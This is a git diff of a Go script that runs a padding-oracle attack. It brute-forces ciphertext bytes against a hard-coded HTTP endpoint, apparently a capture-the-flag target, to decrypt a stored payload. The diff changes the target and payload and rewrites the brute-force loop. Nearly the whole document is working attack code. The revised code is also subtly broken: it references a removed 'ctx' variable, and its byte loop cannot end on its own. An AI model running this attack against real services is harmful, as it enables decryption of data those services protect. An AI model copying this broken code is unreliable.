@@ -20,7 +20,7 @@ var (
 
 const (
 	blockLen    = 16
-	url         = "http://35.227.24.107/91c6c6e269/?post=%s"
+	url         = "http://35.227.24.107/4b511534dd/?post=%s"
 	errorString = "PaddingException"
 	parallel    = 5
 )
@@ -35,7 +35,6 @@ func init() {
 				return http.ErrUseLastResponse
 			},
 		}
-
 }
 
 func decode(s string) []byte {
@@ -52,7 +51,7 @@ func encode(data []byte) string {
 	return encReplacer.Replace(b64)
 }
 
-var payload = "5GTIS9tKmttdwngAIFfOvAfFsdYJKeExI!CTLao1u9DZH!zEuY1yYmnN7aV9WgPEsz9xEKUEVLbYNZTONgpHwxsYrKo-48KXSCUxuE67Sp1-8U9SMIeKBahBggxMpWPAbm2pCRPhqZFx9SgW7bTu-UceZ6sa9BtUTd3GgxYgw!47BKrfQl8p4-Xv4cynpOxbEcW0DqXicoNqwH!VzFD6lQ~~"
+var payload = "P4aMnxs6OAuplAJYRUtytvJjq!i2Rc6E1-k2raJ7!SjRgHt1cXEZyemUO62WCn88iA8BGyL-uvPbdwPQR6GE8jSEHZHiXXzhC-pLofE2Z2qN0Wj1mHOlx3dwjitDcvc!uHbsvwCcK!qp4FV3T5l8oKMSR7pJCVDAl!hp6t989eH4c5VWoUnEhxnVXyNQG6YNTr-aHPvpWhQV663CP23YSw~~"
 
 func main() {
 	var plaintext string
@@ -81,7 +80,6 @@ func main() {
 	}
 
 	fmt.Println(plaintext)
-
 }
 
 // reveals a single block of plaintext
@@ -108,91 +106,56 @@ func revealBlock(ciphertext []byte) []byte {
 // requires cipher input of blockLen*2 and a position (0-blockLen)
 func revealByte(ciphertext []byte, pos int) byte {
 	validCipherByte := ciphertext[pos]
-	ctx, _ := context.WithCancel(context.Background())
-
-	c := make(chan byte)
-	done := make(chan bool, 256)
-	para := make(chan byte, parallel)
 
 	// try every possible byte value
-	for i := byte(0xff); i >= 0; i-- {
-		para <- 0
-		go func(i byte) {
-			// this copy is crucial to make all this parallel shit thread-safe
-			cipherCopy := make([]byte, len(ciphertext))
-			copy(cipherCopy, ciphertext)
+	for i := byte(0); i <= 255; i++ {
 
-			// play with byte at a given position
-			cipherCopy[pos] = i
+		// play with byte at a given position
+		ciphertext[pos] = i
 
-			// send the payload and check for padding error
-			if !testRequest(ctx, cipherCopy) {
-				// send found byte into channel
-				c <- i ^ (blockLen - byte(pos)) ^ validCipherByte
-			} else {
-				// send that we tried...
-				fmt.Println(i)
-				done <- true
-			}
-			_ = <-para
-		}(i)
-	}
+		// send the payload and check for padding error
+		found, err := testRequest(ctx, ciphertext)
+		if err != nil {
+			log.Fatal(err)
+		}
 
-	doneCnt := 0
-	var (
-		result byte
-		failed bool
-	)
-
-loop:
-	for {
-		select {
-		case result = <-c:
-			break loop
-		case <-done:
-			doneCnt++
-			if doneCnt == 256 {
-				// failed to found the proper value, abort stuff
-				failed = true
-				break loop
-
-			}
-		default:
-			continue
+		if found {
+			val := i ^ (blockLen - byte(pos)) ^ validCipherByte
+			fmt.Println(string([]byte{val}))
+			return val
 		}
 	}
 
-	//cancel()
+	log.Fatal("failed to reveal byte")
+	return 0
 
-	if failed {
-		log.Fatal("failed to reveal byte")
-		return 0
-	}
-
-	// reveal the byte
-	return result
 }
 
-func testRequest(ctx context.Context, data []byte) bool {
+func testRequest(ctx context.Context, data []byte) (bool, error) {
 	// encode payload for URL transferring
 	payload := encode(data)
 
 	// send request with retries
-	req, err := http.NewRequestWithContext(ctx, "GET", fmt.Sprintf(url, payload), nil)
+	req, err := http.NewRequestWithContext(context.Background(), "GET", fmt.Sprintf(url, payload), nil)
 	if err != nil {
-		log.Fatal(err)
+		return false, err
 	}
 
-	// process the response
+	// send
 	resp, err := client.Do(req)
+	if err != nil {
+		return false, err
+	}
+
+	// parse response
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		log.Fatal(err)
+		return false, err
 	}
 	defer resp.Body.Close()
 
 	fmt.Print(".")
 
 	// determine padding error
-	return strings.Contains(string(body), errorString)
+	return !strings.Contains(string(body), errorString), nil
 }
